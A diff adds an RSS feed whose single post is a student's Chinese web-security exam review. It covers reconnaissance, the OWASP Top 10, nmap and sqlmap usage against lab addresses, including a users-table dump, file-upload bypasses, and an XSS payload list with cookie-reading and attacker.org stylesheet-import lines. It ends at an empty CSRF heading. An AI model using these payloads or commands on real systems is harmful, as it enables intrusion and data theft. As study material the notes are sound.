@@ -1,0 +1,390 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>security on Resyon&#39;s World</title>
+    <link>https://resyon.github.io/tags/security/</link>
+    <description>Recent content in security on Resyon&#39;s World</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Resyon 2022</copyright>
+    <lastBuildDate>Sat, 11 Dec 2021 19:34:37 +0800</lastBuildDate><atom:link href="https://resyon.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>UNIX pipeline &amp; file descriptor</title>
+      <link>https://resyon.github.io/posts/web-security-review-web-security-review/</link>
+      <pubDate>Sat, 11 Dec 2021 19:34:37 +0800</pubDate>
+      
+      <guid>https://resyon.github.io/posts/web-security-review-web-security-review/</guid>
+      <description>web-security test 试题手写40 整个攻击流程（渗透过程） 渗透-信息的收集  PPT
+  收集域名信息   whois 查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商） tools: whois(kali), 爱站工具网(https://whois.aizhan.com)、站长之家(http://whois.chinaz.com)和VirusTotal(https://www.virustotal.com) 备案信息 tools: ICP备案查询网：http://www.beianbeian.com, 天眼查：http://www.tianyancha.com。  收集敏感信息   利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息   google 常用语法   通过Burp Suite的Repeater功能，（如运行的Server类型及版本，PHP的版本信息等）  收集子域名信息   因为子域名通常护甲较弱
+   子域名检测工具 (eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)
+  搜索引擎枚举 site: ${target_domain}
+  第三方聚合应用枚举 很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域 名。只需在其搜索栏中输入域名，就可检索到相关的域名信息
+  证书透明度公开日志枚举 最简单的方法就是使用搜索引擎搜索一些公开的CT日志
+  收集常用端口信息  关注常见应用的默认端口和在端口上运行的服务，便于渗透 tools: Nmap，无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具
+指纹识别 指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别 应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。 CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。  tools: 御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等</description>
+      <content>&lt;h1 id=&#34;web-security-test&#34;&gt;web-security test&lt;/h1&gt;
+&lt;h2 id=&#34;试题手写40&#34;&gt;试题手写40&lt;/h2&gt;
+&lt;h3 id=&#34;整个攻击流程渗透过程&#34;&gt;整个攻击流程（渗透过程）&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-6df3aeb93bde491b839d3a8a05c4a944.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;渗透-信息的收集&#34;&gt;渗透-信息的收集&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing&#34;&gt;PPT&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;收集域名信息&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;whois
+查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商）
+tools: &lt;code&gt;whois&lt;/code&gt;(kali), &lt;code&gt;爱站工具网&lt;/code&gt;(&lt;a href=&#34;https://whois.aizhan.com&#34;&gt;https://whois.aizhan.com&lt;/a&gt;)、&lt;code&gt;站长之家&lt;/code&gt;(&lt;a href=&#34;http://whois.chinaz.com&#34;&gt;http://whois.chinaz.com&lt;/a&gt;)和&lt;code&gt;VirusTotal&lt;/code&gt;(&lt;a href=&#34;https://www.virustotal.com&#34;&gt;https://www.virustotal.com&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;备案信息
+tools: &lt;code&gt;ICP备案查询网&lt;/code&gt;：http://www.beianbeian.com, &lt;code&gt;天眼查&lt;/code&gt;：http://www.tianyancha.com。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;收集敏感信息&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;google 常用语法
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-b041a8198d7c40109ed3f4c5b8613e6a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;通过&lt;code&gt;Burp Suite&lt;/code&gt;的&lt;code&gt;Repeater&lt;/code&gt;功能，（如运行的Server类型及版本，PHP的版本信息等）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;收集子域名信息&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;因为子域名通常护甲较弱&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;子域名检测工具
+(eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;搜索引擎枚举
+&lt;code&gt;site: ${target_domain}&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;第三方聚合应用枚举
+很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域
+名。只需在其搜索栏中输入域名，就可检索到相关的域名信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;证书透明度公开日志枚举
+最简单的方法就是使用搜索引擎搜索一些公开的CT日志&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;收集常用端口信息&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;关注常见应用的默认端口和在端口上运行的服务，便于渗透
+tools: &lt;code&gt;Nmap&lt;/code&gt;，无状态端口扫描工具&lt;code&gt;Masscan&lt;/code&gt;、&lt;code&gt;ZMap&lt;/code&gt;和&lt;code&gt;御剑高速TCP端口扫描工具&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;指纹识别
+指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别
+应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。
+CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;tools: &lt;code&gt;御剑Web指纹识别&lt;/code&gt;、&lt;code&gt;WhatWeb&lt;/code&gt;、&lt;code&gt;WebRobo&lt;/code&gt;、&lt;code&gt;椰树&lt;/code&gt;、&lt;code&gt;轻量WEB指纹识别&lt;/code&gt;等&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;寻找真实ip&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;无CDN: tools: &lt;a href=&#34;http://www.ip138.com&#34;&gt;www.ip138.com&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;有CDN: &lt;del&gt;我赌他不考&lt;/del&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;收集敏感目录&lt;/li&gt;
+&lt;li&gt;社会工程学&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;owsp十大安全漏洞&#34;&gt;OWSP十大安全漏洞&lt;/h3&gt;
+&lt;p&gt;OWASP组织：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正.实际.有成本效益的信息。其目的是协助个人.企业和机构来发现和使用可信赖软件。
+十个漏洞：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;注入&lt;/li&gt;
+&lt;li&gt;失效的身份认证和会话管理&lt;/li&gt;
+&lt;li&gt;跨站脚本&lt;/li&gt;
+&lt;li&gt;不安全的直接对象引用&lt;/li&gt;
+&lt;li&gt;安全配置错误&lt;/li&gt;
+&lt;li&gt;敏感信息泄露&lt;/li&gt;
+&lt;li&gt;功能级访问控制缺失&lt;/li&gt;
+&lt;li&gt;跨站请求伪造&lt;/li&gt;
+&lt;li&gt;使用含有已知漏洞的组件&lt;/li&gt;
+&lt;li&gt;未验证的重定向与 转发&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;web-及工作原理&#34;&gt;&lt;del&gt;web 及工作原理&lt;/del&gt;&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing&#34;&gt;web, php, mysql, etc 网安入门 ppt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2b150c9ecbad4114a85cfddc3f5beda4.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-d5537aaf28244053816285b340304493.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-6bbd4f4973a4456788762a8ef25d87e7.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2293c0d9f06f40bba5b297d709ab033f.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-0418374bc0aa483d9e7d15f1755bef8d.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-8afcc2d81e8c410aa5c2b7a5ae050e06.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;web框架怎样的结构哪三层作用是什么&#34;&gt;web框架怎样的结构，哪三层，作用是什么&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;del&gt;下面给的原答案好像有点问题&lt;/del&gt;
+说的可能是 &lt;a href=&#34;https://developer.aliyun.com/article/45632&#34;&gt;这个&lt;/a&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-ad5b8643660b40b79d406f882cf68405.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;web应用-&amp;gt;应用服务器-&amp;gt;数据库服务器&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;web应用：可以通过Web访问的应用程序, eg. WordPress&lt;/li&gt;
+&lt;li&gt;应用程序服务器（英语：application server）是一种软件框架，提供一个应用程序运行的环境。 用于为应用程序提供安全.数据.事务支持.负载平衡大型分布式系统管理等服务。eg. Apache, IIS&lt;/li&gt;
+&lt;li&gt;数据库服务器：是联系Web服务器与数据库管理系统（DBMS）的中间件是负责处理所有的应用程序服务器，包括在web服务器和后台的应用程序或数据库之间的事务处理和数据访问。eg&amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;三个工具主要功能简单操作要会&#34;&gt;三个工具主要功能，简单操作要会&lt;/h3&gt;
+&lt;h4 id=&#34;burpsuite&#34;&gt;burpsuite&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1Ps-miNR8luOUMqi36Co4uaY9DTZM3BFVsEEwLLN8KKY/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Burp_suite&#34;&gt;ref&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;用于测试网络应用程序安全性的图形化工具(java)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;HTTP Proxy — 拦截、查看、修改所有在客户端与服务端之间传输的数据。(他就是个拦截，指道的，发挥其他功能要靠下面的模块)&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Scanner&lt;/del&gt; — Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。&lt;/li&gt;
+&lt;li&gt;Intruder — 对 Web 应用程序执行自动攻击。提供可配置算法，可生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入、跨站脚本、参数篡改和易暴力攻击的漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Spider&lt;/del&gt; — 自动抓取 Web 应用程序的工具。可以与手工映射技术一起使用，加快映射应用程序内容和功能的过程。&lt;/li&gt;
+&lt;li&gt;Repeater — 用来手动测试应用程序的简单工具。用于修改对服务器的请求，重新发送并观察结果。它最大的用途就是能和其他 Burp Suite工具结合起来使用。可以将目标站点地图、 Burp Proxy/浏览记录、 Burp Intruder的攻击结果，发送到 Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Decoder&lt;/del&gt; — 将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。能够利用启发式技术智能识别多种编码格式。&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Comparer&lt;/del&gt; — 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Extender&lt;/del&gt; — 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;Sequencer&lt;/del&gt; — 分析数据项样本随机性的工具。可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;nmap&#34;&gt;nmap&lt;/h4&gt;
+&lt;p&gt;Nmap( Network Mapper,网络映射器), &lt;code&gt;网络探测&lt;/code&gt;和&lt;code&gt;安全审核&lt;/code&gt;工具。用来&lt;code&gt;快速扫描大型网络&lt;/code&gt;，包括&lt;code&gt;主机探测与发现&lt;/code&gt;、&lt;code&gt;开放的端口情况&lt;/code&gt;、操作系统与应用服务&lt;code&gt;指纹识别&lt;/code&gt;、WAF识别及常见安全漏洞。&lt;del&gt;它的图形化界面是Zenmap,分布式框架为Dmap。&lt;/del&gt;
+特点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;主机探测：探则网络上的主机，如列出响应TCP和CMP请求、ICMP请求、开放特别端口的主机&lt;/li&gt;
+&lt;li&gt;端口扫描：探测目标主机所开放的端口&lt;/li&gt;
+&lt;li&gt;版本检测：探测目标主机的网络服务，判断其服务名称及版本号&lt;/li&gt;
+&lt;li&gt;系统检测：探测目标主机的操作系统及网络设备的硬件特性&lt;/li&gt;
+&lt;li&gt;支持探测脚本的编写：使用Nmap的脚本引擎(NSE)和lua编程语言。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 扫主机&lt;/span&gt;
+nmap 192.168.1.105 192.168.1.106 &lt;span style=&#34;color:#75715e&#34;&gt;# 1个或多个&lt;/span&gt;
+
+nmap 192.168.1.105-106 &lt;span style=&#34;color:#75715e&#34;&gt;# 和上面一样&lt;/span&gt;
+
+nmap 192.168.1.0/24 &lt;span style=&#34;color:#75715e&#34;&gt;# 团灭整个网段&lt;/span&gt;
+
+nmap --li /tmp/file --exclude 192.168.1.105 --excludefile /tmp/file1 &lt;span style=&#34;color:#75715e&#34;&gt;# 扫`file`整个文件, 除了`192.168.1.105`和文件`file1`里头的&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 路由跟踪&lt;/span&gt;
+nmap --traceroute 192.168.1.105 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 扫端口&lt;/span&gt;
+nmap 192.168.0.100 –p 21,22,23,80
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 扫在线状况&lt;/span&gt;
+nmap –sP 192.168.0.100/24 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 操作系统指纹识别&lt;/span&gt;
+nmap –O 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# 识别操作系统的版本&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 服务版本检测&lt;/span&gt;
+nmap -sV 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# 检测开放端口对应的服务版本信息&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 探测防火墙状态  &lt;/span&gt;
+nmap -sF -T4 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# FIN扫描用于识别端口是否关闭，RST: 端口关闭，否则是open或 filtered状态.&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2b222cb254a2483eac14c1d169a5f093.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;sqlmap&#34;&gt;sqlmap&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1RTnsCI0q02FCXouj4AYTvYbsAS-vo97keWnRdWRe-pQ/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-4b322e227b804a6cbd763c0f357ee550.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 扫单个url, url都加双引号就对了&lt;/span&gt;
+sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.104/sql1/Less-1/?id=1&amp;amp;uid=2&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 扫文件里的&lt;/span&gt;
+sqlmap.py -r desktop/1.txt
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# show databases;&lt;/span&gt;
+sqlmap.py -u http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --dbs
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# use security; show tables;&lt;/span&gt;
+sqlmap.py -u http://127.0.0.1/sql/Less-1?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -D security --tables 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# desc security.users;&lt;/span&gt;
+sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span&gt; -D security -T users --columns
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# select * from security.users; &lt;/span&gt;
+sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” -D security -T users  --dump
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 获取数据库的所有用户&lt;/span&gt;
+sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span&gt; -users
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前网站数据库的名称&lt;/span&gt;
+sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” --current-db
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前网站数据库的用户名称&lt;/span&gt;
+sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” --current-user
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;实操&#34;&gt;实操&lt;/h2&gt;
+&lt;h3 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1BoP8zCuAYZvGmVxFBFtKwGdJB29VHF9RfnkThf-WDoM/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。&lt;/p&gt;
+&lt;p&gt;SQL注入漏洞的产生需要满足以下两个条件：
+1、参数用户可控：前端传给后端的参数内容是用户可以控制的。
+2、参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询&lt;/p&gt;
+&lt;h4 id=&#34;考点&#34;&gt;考点&lt;/h4&gt;
+&lt;p&gt;虚拟机下完成union boolean 报错注入
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-81e503bcb28b41128b1162536612347e.png&#34; alt=&#34;image.png&#34;&gt;
+&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-5a6640925c8c4076a3049f7b750a909f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;文件上传&#34;&gt;文件上传&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1XUfC7W_sLhVOxO8n_CksYJIxchn31_TatbjwG_JTHKk/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器&lt;/p&gt;
+&lt;h4 id=&#34;js绕过&#34;&gt;js绕过&lt;/h4&gt;
+&lt;p&gt;原因：这种情况只是对&lt;code&gt;http head&lt;/code&gt;中的&lt;code&gt;Content-Type&lt;/code&gt;字段进行限制
+方案：此时只需要使用&lt;code&gt;burpsuite&lt;/code&gt;啥的把Content-Type改了&lt;/p&gt;
+&lt;h4 id=&#34;图马绕过&#34;&gt;图马绕过&lt;/h4&gt;
+&lt;p&gt;原因：服务端对文件进行了检测
+方案：&lt;del&gt;他没给，肯定不考&lt;/del&gt;&lt;/p&gt;
+&lt;h4 id=&#34;考点-1&#34;&gt;考点&lt;/h4&gt;
+&lt;p&gt;文件上传&amp;ndash;js检测绕过漏洞
+文件后缀(改名)
+文件类型绕过(burpsuite改Content-Type)&lt;/p&gt;
+&lt;h3 id=&#34;暴力破解&#34;&gt;暴力破解&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1Bs7VGNWOsRhZp1QTU4QG48VBut20a86tOY1KfSuNy2M/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
+&lt;p&gt;在Web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击一将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
+XSS的基本实现思路很简单：比如持久型XSS通过一些正常的站内交互途径，例如发布评论，提交含有Javascript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。&lt;/p&gt;
+&lt;h4 id=&#34;考点-2&#34;&gt;考点&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;XSS反射型/存储型
+方法一:用&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;标签代替&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;
+&lt;code&gt;&amp;lt;img src=1 onerror=alert(&#39;xss&#39;)&amp;gt;&lt;/code&gt;
+方法二:双写绕过&lt;code&gt;&amp;lt;s&amp;lt;script&amp;gt;cript&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;
+方法三:大小写绕过
+&lt;code&gt;&amp;lt;ScRipt&amp;gt;alert(&#39;xss&#39;)&amp;lt;/ScRipt&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DOM型
+&lt;code&gt;?default=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;上面不行，试试下面的&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;第一类：Javascript URL
+
+&amp;lt;a href=&amp;quot;javascript:alert(&#39;test&#39;)&amp;quot;&amp;gt;link&amp;lt;/a&amp;gt;
+
+&amp;lt;a href=&amp;quot;java&amp;amp;#115;cript:alert(&#39;xss&#39;)&amp;quot;&amp;gt;link&amp;lt;/a&amp;gt;
+
+&amp;lt;iframe src=javascript:alert(&#39;xss&#39;)&amp;gt;
+
+第二类：Inline style
+
+&amp;lt;div style=&amp;quot;color: expression(alert(&#39;XSS&#39;))&amp;quot;&amp;gt;
+
+&amp;lt;div style=color:expression\(alert(1))&amp;gt;&amp;lt;/div&amp;gt;
+
+第三类：JavaScript 事件
+
+&amp;lt;img src=1 onclick=alert(&#39;xss&#39;)&amp;gt;
+
+&amp;lt;img src=1 onerror=alert(&#39;xss&#39;)&amp;gt;
+
+&amp;lt;body onload=alert(&#39;xss&#39;)&amp;gt;
+
+第四类：Script标签
+
+&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
+
+&amp;lt;script&amp;gt;window.location=&#39;http://www.163.com&#39;&amp;lt;/script&amp;gt;
+
+&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/scr&amp;lt;script&amp;gt;ipt&amp;gt;
+
+&amp;lt;SCRIPT&amp;gt;alert(&#39;xss&#39;)&amp;lt;/SCRIPT&amp;gt;
+
+第五类：CSS import
+
+&amp;lt;style&amp;gt;@import url(&amp;quot;http://attacker.org/malicious.css&amp;quot;);&amp;lt;/style&amp;gt;
+
+&amp;lt;style&amp;gt;@imp\ort url(&amp;quot;http://attacker.org/malicious.css&amp;quot;);&amp;lt;/style&amp;gt;
+
+&amp;lt;STYLE&amp;gt;@im\port&#39;\ja\vasc\ript:alert(&amp;quot;XSS&amp;quot;)&#39;;&amp;lt;/STYLE&amp;gt;
+
+&amp;lt;STYLE&amp;gt;@import&#39;http://jb51.net/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;csrf--原理&#34;&gt;CSRF  原理&lt;/h3&gt;
+&lt;p&gt;CSRF( Cross- site request forgery,跨站请求伪造)也被称为 One ClickAttackt或者 Session Riding,通常缩写为CSRF或者XSRF,是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS),但它与XSs非常不同，XSS利用站点内的信任用户而CSRF通过你装成受信任用户请求受信任的网站。与XSS攻击相比CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。&lt;/p&gt;
+&lt;p&gt;攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。&lt;/p&gt;
+&lt;h4 id=&#34;考点-3&#34;&gt;考点&lt;/h4&gt;
